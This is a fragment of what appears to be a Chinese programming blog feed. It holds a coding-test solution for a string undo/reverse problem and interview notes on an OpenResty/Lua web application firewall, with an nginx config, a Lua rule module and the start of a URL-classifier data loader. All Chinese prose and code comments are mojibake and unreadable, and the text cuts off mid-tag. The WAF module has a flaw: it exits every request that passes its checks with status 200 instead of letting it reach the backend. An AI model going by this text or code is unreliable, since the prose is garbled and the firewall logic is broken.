        <content type="html"><![CDATA[<h2 id="0315ç¾å›¢"><a href="#0315ç¾å›¢" class="headerlink" title="0315ç¾å›¢"></a>0315ç¾å›¢</h2><h3 id="å°ç¾çš„æ–‡æœ¬æ–‡ä»¶"><a href="#å°ç¾çš„æ–‡æœ¬æ–‡ä»¶" class="headerlink" title="å°ç¾çš„æ–‡æœ¬æ–‡ä»¶"></a>å°ç¾çš„æ–‡æœ¬æ–‡ä»¶</h3><p>å°ç¾æœ‰ä¸€ä¸ªç”±å¤§å°å†™å­—æ¯æ··åˆæ„æˆçš„åŠ å¯†å­—ç¬¦ä¸²sï¼Œä½ éœ€è¦æŒ‰ç…§ä»¥ä¸‹å‡†åˆ™å°†å…¶è§£å¯†å¾—åˆ°å­—ç¬¦ä¸²tã€‚åˆå§‹æ—¶å­—ç¬¦ä¸²tä¸ºç©ºï¼Œå¯¹äºå­—ç¬¦ä¸²sçš„æ¯ä¸€ä¸ªå­—ç¬¦ï¼š<br>å¦‚æœsçš„ç¬¬iä¸ªå­—ç¬¦ä¸ºâ€™Râ€™ï¼ˆä¿è¯è‡³å¤šå‡ºç°ä¸€æ¬¡ï¼‰ï¼Œåˆ™åè½¬å­—ç¬¦ä¸²tã€‚<br>å¦‚æœsçš„ç¬¬iä¸ªå­—ç¬¦ä¸ºâ€™Zâ€™ï¼ˆä¿è¯è‡³å¤šå‡ºç°ä¸€æ¬¡ï¼‰ï¼Œåˆ™æ’¤é”€ä¸Šä¸€æ­¥æ“ä½œï¼Œå…·ä½“åœ°ï¼š<br>    å¦‚æœä¸Šä¸€æ­¥ä¸ºâ€˜Râ€™ï¼Œåˆ™å–æ¶ˆåè½¬ï¼›<br>    å¦‚æœä¸Šä¸€æ­¥ä¸ºå…¶ä»–å­—ç¬¦ï¼Œåˆ é™¤è¿™ä¸ªå­—ç¬¦ï¼›<br>    ä¸Šä¸€æ­¥ä¸ºç©ºï¼Œåˆ™è·³è¿‡è¿™ä¸ªæ“ä½œï¼›<br>å…¶ä»–æƒ…å†µï¼Œç›´æ¥å°†è¿™ä¸ªå­—ç¬¦æ·»åŠ åˆ°å­—ç¬¦ä¸²tçš„æœ«å°¾ã€‚è¯·ä½ ç›´æ¥è¾“å‡ºè§£å¯†å®Œæˆåçš„å­—ç¬¦ä¸²tã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    t = []                 <span class="comment"># ç”¨åˆ—è¡¨æ¨¡æ‹Ÿå­—ç¬¦ä¸² t çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">    history = []           <span class="comment"># è®°å½•æ¯ä¸€æ­¥æ“ä½œï¼Œæ–¹ä¾¿å¤„ç† &#x27;Z&#x27; å›æ»š</span></span><br><span class="line">    <span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(s):</span><br><span class="line">        <span class="keyword">if</span> c == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">            t.reverse()</span><br><span class="line">            history.append(<span class="string">&#x27;R&#x27;</span>)  <span class="comment"># è®°å½•åè½¬æ“ä½œ</span></span><br><span class="line">        <span class="keyword">elif</span> c == <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> history:</span><br><span class="line">                last_op = history.pop()</span><br><span class="line">                <span class="keyword">if</span> last_op == <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">                    t.reverse()  <span class="comment"># æ’¤é”€åè½¬</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> t:</span><br><span class="line">                        t.pop()  <span class="comment"># æ’¤é”€æ·»åŠ çš„å­—ç¬¦</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            t.append(c)</span><br><span class="line">            history.append(c)     <span class="comment"># è®°å½•æ™®é€šå­—ç¬¦æ·»åŠ æ“ä½œ</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(t)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–å¤šç»„è¾“å…¥</span></span><br><span class="line">T = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(T):</span><br><span class="line">    s = <span class="built_in">input</span>().strip()</span><br><span class="line">    result = decrypt_string(s)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ã€å·¥ä½œã€‘é¢è¯•é¢˜æ•´ç† é¡¹ç›®é—®é¢˜å‡†å¤‡</title>
      <link href="/2024/03/25/work/workproject/"/>
      <url>/2024/03/25/work/workproject/</url>
      
        <content type="html"><![CDATA[<h2 id="åŸºäºOpenRestyçš„Webåº”ç”¨é˜²ç«å¢™"><a href="#åŸºäºOpenRestyçš„Webåº”ç”¨é˜²ç«å¢™" class="headerlink" title="åŸºäºOpenRestyçš„Webåº”ç”¨é˜²ç«å¢™"></a>åŸºäºOpenRestyçš„Webåº”ç”¨é˜²ç«å¢™</h2><p>OpenRestyæ˜¯ä¸€ä¸ªé›†æˆäº†Nginxå’ŒLuaçš„é«˜æ€§èƒ½Webå¹³å°ï¼Œé€šè¿‡åµŒå…¥Luaè™šæ‹Ÿæœºï¼ˆLuaVMï¼‰å®ç°äº†å¯¹HTTPè¯·æ±‚çš„é«˜æ•ˆå¤„ç†ã€‚åŸºäºOpenRestyçš„Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰åˆ©ç”¨äº†Nginxçš„é«˜æ€§èƒ½å’ŒLuaçš„çµæ´»æ€§ï¼Œé€šè¿‡åœ¨Nginxçš„å„ä¸ªå¤„ç†é˜¶æ®µï¼ˆå¦‚è®¿é—®æ§åˆ¶é˜¶æ®µã€æ—¥å¿—è®°å½•é˜¶æ®µç­‰ï¼‰åµŒå…¥Luaè„šæœ¬ï¼Œå®ç°äº†å¯¹HTTPè¯·æ±‚çš„æ·±åº¦æ£€æµ‹å’Œé˜²å¾¡ã€‚</p><ul><li><strong>è§„åˆ™åŒ¹é…ä¸é˜²å¾¡åŠ¨ä½œ</strong>ï¼šé€šè¿‡å®šä¹‰ä¸€ç³»åˆ—å®‰å…¨è§„åˆ™ï¼ˆå¦‚IPé»‘ç™½åå•ã€URLè¿‡æ»¤è§„åˆ™ç­‰ï¼‰ï¼Œåœ¨è¯·æ±‚å¤„ç†è¿‡ç¨‹ä¸­åŒ¹é…è¿™äº›è§„åˆ™ï¼Œå¹¶æ ¹æ®åŒ¹é…ç»“æœæ‰§è¡Œç›¸åº”çš„é˜²å¾¡åŠ¨ä½œï¼ˆå¦‚æ‹’ç»è¯·æ±‚ã€è¿”å›403çŠ¶æ€ç ç­‰ï¼‰ã€‚</li><li><strong>æ—¥å¿—è®°å½•ä¸ç›‘æ§</strong>ï¼šæ”¯æŒå°†æ‰€æœ‰æ‹’ç»çš„æ“ä½œè®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œæ—¥å¿—æ ¼å¼é€šå¸¸ä¸ºJSONï¼Œä¾¿äºåç»­ä½¿ç”¨ELKç­‰å·¥å…·è¿›è¡Œåˆ†æã€‚</li><li><strong>çµæ´»çš„éƒ¨ç½²ä¸ç»´æŠ¤</strong>ï¼šå¯ä»¥é‡‡ç”¨è‡ªåŠ¨åŒ–éƒ¨ç½²å·¥å…·ï¼ˆå¦‚Ansibleï¼‰æ¥ç®€åŒ–éƒ¨ç½²è¿‡ç¨‹ï¼ŒåŒæ—¶éœ€è¦å®šæœŸè¯„ä¼°å’Œæ›´æ–°é˜²ç«å¢™è§„åˆ™ï¼Œä»¥åº”å¯¹æ–°å‹æ”»å‡»ã€‚</li></ul><p><strong>é—®é¢˜1ï¼šOpenResty WAFå¦‚ä½•å¤„ç†ä¸€ä¸ªHTTPè¯·æ±‚ï¼Ÿ</strong><br>å›ç­”ï¼šå½“ä¸€ä¸ªHTTPè¯·æ±‚åˆ°è¾¾OpenResty WAFæ—¶ï¼Œå®ƒä¼šä¾æ¬¡ç»è¿‡Nginxçš„å¤šä¸ªå¤„ç†é˜¶æ®µã€‚åœ¨æ¯ä¸ªé˜¶æ®µï¼ŒåµŒå…¥çš„Luaè„šæœ¬ä¼šæ ¹æ®é¢„å®šä¹‰çš„å®‰å…¨è§„åˆ™å¯¹è¯·æ±‚è¿›è¡Œæ£€æµ‹ã€‚ä¾‹å¦‚ï¼Œåœ¨è®¿é—®æ§åˆ¶é˜¶æ®µï¼Œä¼šæ£€æŸ¥è¯·æ±‚çš„IPåœ°å€æ˜¯å¦åœ¨é»‘åå•ä¸­ï¼ŒURLæ˜¯å¦ç¬¦åˆç™½åå•ç­‰ã€‚å¦‚æœè¯·æ±‚ä¸ç¬¦åˆå®‰å…¨è§„åˆ™ï¼Œå°†ç›´æ¥è¢«æ‹’ç»æˆ–è¿”å›ç›¸åº”çš„é”™è¯¯ç ã€‚</p><p><strong>é—®é¢˜2ï¼šå¦‚ä½•åœ¨OpenRestyä¸­å®ç°ä¸€ä¸ªç®€å•çš„WAFè§„åˆ™ï¼Œä¾‹å¦‚é™åˆ¶ç‰¹å®šçš„URLè®¿é—®ï¼Ÿ</strong><br>å›ç­”ï¼šå¯ä»¥é€šè¿‡ç¼–è¾‘Nginxçš„é…ç½®æ–‡ä»¶ï¼Œåœ¨<code>access_by_lua_block</code>ä¸­ç¼–å†™Luaè„šæœ¬æ¥å®ç°ã€‚ä¾‹å¦‚ï¼Œè·å–è¯·æ±‚çš„URLå¹¶æ£€æŸ¥æ˜¯å¦åŒ…å«ç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœåŒ…å«åˆ™è¿”å›403çŠ¶æ€ç ã€‚</p><p><strong>é—®é¢˜4ï¼šå¦‚ä½•ä¼˜åŒ–OpenResty WAFçš„æ€§èƒ½ï¼Ÿ</strong><br>å›ç­”ï¼šå¯ä»¥é€šè¿‡ä¼˜åŒ–Nginxçš„é…ç½®ï¼ˆå¦‚è°ƒæ•´å·¥ä½œè¿›ç¨‹æ•°ã€è¿æ¥è¶…æ—¶æ—¶é—´ç­‰ï¼‰ã€ä½¿ç”¨ LuaJIT æé«˜ Lua è„šæœ¬çš„æ‰§è¡Œæ•ˆç‡ã€ç¼“å­˜å¸¸ç”¨çš„è§„åˆ™åŒ¹é…ç»“æœç­‰æ–¹å¼æ¥æå‡æ€§èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">lua_shared_dict</span> waf_cache <span class="number">10m</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="section">access_by_lua_block</span> &#123;</span><br><span class="line">                <span class="attribute">local</span> waf = require <span class="string">&quot;waf&quot;</span></span><br><span class="line">                local waf_instance = waf.new()</span><br><span class="line">                waf_instance:exec()</span><br><span class="line">            &#125;</span><br><span class="line">            proxy_pass http://backend;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> /status &#123;</span><br><span class="line">            <span class="section">access_by_lua_block</span> &#123;</span><br><span class="line">                <span class="attribute">local</span> waf = require <span class="string">&quot;waf&quot;</span></span><br><span class="line">                local waf_instance = waf.new()</span><br><span class="line">                waf_instance:exec()</span><br><span class="line">            &#125;</span><br><span class="line">            stub_status <span class="literal">on</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WAF-luaè„šæœ¬"><a href="#WAF-luaè„šæœ¬" class="headerlink" title="WAF luaè„šæœ¬"></a>WAF luaè„šæœ¬</h3><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> waf = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf.new</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">self</span> = &#123;</span><br><span class="line">        rules = &#123;</span><br><span class="line">            <span class="comment">-- IP é»‘ç™½åå•è§„åˆ™</span></span><br><span class="line">            ip_whitelist = &#123;<span class="string">&quot;127.0.0.1&quot;</span>&#125;,</span><br><span class="line">            ip_blacklist = &#123;&#125;,</span><br><span class="line">            <span class="comment">-- URL è§„åˆ™</span></span><br><span class="line">            url_rules = &#123;</span><br><span class="line">                &#123;pattern = <span class="string">&quot;/admin&quot;</span>, action = <span class="string">&quot;deny&quot;</span>&#125;,</span><br><span class="line">                &#123;pattern = <span class="string">&quot;/api&quot;</span>, action = <span class="string">&quot;allow&quot;</span>&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">-- å‚æ•°è§„åˆ™</span></span><br><span class="line">            param_rules = &#123;</span><br><span class="line">                &#123;name = <span class="string">&quot;user&quot;</span>, pattern = <span class="string">&quot;[^a-zA-Z0-9_]&quot;</span>, action = <span class="string">&quot;deny&quot;</span>&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        cache = &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- åˆå§‹åŒ–ç¼“å­˜</span></span><br><span class="line">    <span class="built_in">self</span>.cache = ngx.shared.waf_cache</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">self</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf:exec</span><span class="params">()</span></span></span><br><span class="line">    <span class="comment">-- è·å–å®¢æˆ·ç«¯ IP</span></span><br><span class="line">    <span class="keyword">local</span> client_ip = ngx.var.remote_addr</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥ IP é»‘ç™½åå•</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">self</span>:check_ip(client_ip) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- è·å–è¯·æ±‚çš„ URI</span></span><br><span class="line">    <span class="keyword">local</span> uri = ngx.var.uri</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥ URL è§„åˆ™</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">self</span>:check_url(uri) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- è·å–è¯·æ±‚å‚æ•°</span></span><br><span class="line">    <span class="keyword">local</span> args = ngx.req.get_uri_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥å‚æ•°è§„åˆ™</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">self</span>:check_params(args) <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- å¦‚æœæ‰€æœ‰æ£€æŸ¥é€šè¿‡ï¼Œå…è®¸è¯·æ±‚</span></span><br><span class="line">    ngx.<span class="built_in">exit</span>(ngx.HTTP_OK)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf:check_ip</span><span class="params">(ip)</span></span></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥ IP æ˜¯å¦åœ¨é»‘åå•ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> _, blacklisted_ip <span class="keyword">in</span> <span class="built_in">ipairs</span>(<span class="built_in">self</span>.rules.ip_blacklist) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> ip == blacklisted_ip <span class="keyword">then</span></span><br><span class="line">            ngx.<span class="built_in">log</span>(ngx.ERR, <span class="string">&quot;IP &quot;</span> .. ip .. <span class="string">&quot; is blacklisted&quot;</span>)</span><br><span class="line">            ngx.<span class="built_in">exit</span>(ngx.HTTP_FORBIDDEN)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥ IP æ˜¯å¦åœ¨ç™½åå•ä¸­</span></span><br><span class="line">    <span class="keyword">for</span> _, whitelisted_ip <span class="keyword">in</span> <span class="built_in">ipairs</span>(<span class="built_in">self</span>.rules.ip_whitelist) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> ip == whitelisted_ip <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">-- å¦‚æœä¸åœ¨ç™½åå•ä¸­ï¼Œå…è®¸è¯·æ±‚ç»§ç»­æ£€æŸ¥å…¶ä»–è§„åˆ™</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf:check_url</span><span class="params">(uri)</span></span></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥ URL æ˜¯å¦åŒ¹é…è§„åˆ™</span></span><br><span class="line">    <span class="keyword">for</span> _, rule <span class="keyword">in</span> <span class="built_in">ipairs</span>(<span class="built_in">self</span>.rules.url_rules) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> uri:<span class="built_in">match</span>(rule.pattern) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">if</span> rule.action == <span class="string">&quot;deny&quot;</span> <span class="keyword">then</span></span><br><span class="line">                ngx.<span class="built_in">log</span>(ngx.ERR, <span class="string">&quot;URI &quot;</span> .. uri .. <span class="string">&quot; is denied by rule&quot;</span>)</span><br><span class="line">                ngx.<span class="built_in">exit</span>(ngx.HTTP_FORBIDDEN)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">            <span class="keyword">elseif</span> rule.action == <span class="string">&quot;allow&quot;</span> <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf:check_params</span><span class="params">(args)</span></span></span><br><span class="line">    <span class="comment">-- æ£€æŸ¥è¯·æ±‚å‚æ•°æ˜¯å¦ç¬¦åˆè§„åˆ™</span></span><br><span class="line">    <span class="keyword">for</span> param_name, param_value <span class="keyword">in</span> <span class="built_in">pairs</span>(args) <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">for</span> _, rule <span class="keyword">in</span> <span class="built_in">ipairs</span>(<span class="built_in">self</span>.rules.param_rules) <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">if</span> param_name == rule.name <span class="keyword">then</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(param_value) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">                    <span class="keyword">for</span> _, value <span class="keyword">in</span> <span class="built_in">ipairs</span>(param_value) <span class="keyword">do</span></span><br><span class="line">                        <span class="keyword">if</span> value:<span class="built_in">match</span>(rule.pattern) <span class="keyword">then</span></span><br><span class="line">                            ngx.<span class="built_in">log</span>(ngx.ERR, <span class="string">&quot;Parameter &quot;</span> .. param_name .. <span class="string">&quot; has invalid value&quot;</span>)</span><br><span class="line">                            ngx.<span class="built_in">exit</span>(ngx.HTTP_FORBIDDEN)</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                        <span class="keyword">end</span></span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">if</span> param_value:<span class="built_in">match</span>(rule.pattern) <span class="keyword">then</span></span><br><span class="line">                        ngx.<span class="built_in">log</span>(ngx.ERR, <span class="string">&quot;Parameter &quot;</span> .. param_name .. <span class="string">&quot; has invalid value&quot;</span>)</span><br><span class="line">                        ngx.<span class="built_in">exit</span>(ngx.HTTP_FORBIDDEN)</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">                    <span class="keyword">end</span></span><br><span class="line">                <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> waf</span><br></pre></td></tr></table></figure><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">data_dir = <span class="string">r&#x27;.\dataset&#x27;</span></span><br><span class="line">label = []</span><br><span class="line">allData = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> label_type <span class="keyword">in</span> [<span class="string">&#x27;good.txt&#x27;</span>, <span class="string">&#x27;bad.txt&#x27;</span>]:</span><br><span class="line">    file_path = os.path.join(data_dir, label_type)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            allData.append(line.decode())</span><br><span class="line">            label.append(<span class="number">0</span> <span class="keyword">if</span> label_type == <span class="string">&#x27;good.txt&#x27;</span> <span class="keyword">else</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>åŠŸèƒ½</strong>ï¼šä»æŒ‡å®šç›®å½•åŠ è½½æ ‡è®°ä¸ºâ€å¥½â€å’Œâ€åâ€çš„æ–‡æœ¬æ•°æ®ã€‚</li><li><strong>æŠ€æœ¯ç»†èŠ‚</strong>ï¼šä½¿ç”¨äºŒè¿›åˆ¶æ¨¡å¼è¯»å–æ–‡ä»¶ï¼Œç¡®ä¿æ•°æ®çš„å®Œæ•´æ€§å’Œå…¼å®¹æ€§ã€‚æ ¹æ®æ–‡ä»¶ååŒºåˆ†æ ‡ç­¾ï¼Œä¸ºåç»­çš„æ¨¡å‹è®­ç»ƒæä¾›ç›‘ç£ä¿¡æ¯ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">max_length = <span class="number">50</span></span><br><span class="line">characters = string.printable</span><br><span class="line">token_index = <span class="built_in">dict</span>(<span class="built_in">zip</span>(characters, <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(characters) + <span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">proData = np.zeros((<span class="built_in">len</span>(allData), max_length, <span class="built_in">max</span>(token_index.values()) + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i, sample <span class="keyword">in</span> <span class="built_in">enumerate</span>(allData):</span><br><span class="line">    <span class="keyword">for</span> j, character <span class="keyword">in</span> <span class="built_in">enumerate</span>(sample[:max_length]):</span><br><span class="line">        index = token_index.get(character)</span><br><span class="line">        <span class="keyword">if</span> index:</span><br><span class="line">            proData[i, j, index] = <span 